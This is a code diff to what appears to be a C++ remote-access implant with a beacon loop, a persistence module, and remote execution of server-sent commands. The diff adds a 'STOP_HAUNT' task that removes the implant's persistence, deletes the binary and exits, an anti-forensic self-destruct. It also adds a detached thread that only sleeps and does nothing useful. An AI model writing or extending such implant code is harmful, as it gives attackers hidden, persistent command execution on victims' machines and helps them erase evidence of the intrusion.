@@ -2,6 +2,7 @@
 #include <vector>
 #include <thread>
 #include <chrono>
+#include <cstdlib>
 
 #include "apiSchema.hpp"
 #include "config.hpp"
@@ -58,6 +59,16 @@ public:
         }
 
         LOG_ERROR("Persistence failed")
+    }
+
+    void kill() {
+        bool removedPersistence = Persistence::removeRunControl() == 0;
+        bool selfDestroyed = Persistence::selfDestroy() == 0;
+
+        LOG_ALERT("removed persistence: {}, self destroyed: {}", removedPersistence, selfDestroyed)
+        
+        // exit
+        std::exit(0);
     }
 
     void beacon() {
@@ -119,6 +130,21 @@ private:
 
         TaskResultDto result;
         result.taskId = task.id;
+
+        if (task.command == "STOP_HAUNT") {
+            result.output = "GOODBYE";
+            result.status = TaskStatus::Done;
+            LOG_ALERT("GOODBYE")
+            
+            pendingResults.push_back(result);
+
+            std::thread([]() {
+                std::this_thread::sleep_for(std::chrono::seconds(5));
+            }).detach();
+
+            kill();
+            return;
+        }
 
         result.output = Utils::executeCommand(task.command + " " + task.args);
         result.status = TaskStatus::Done;
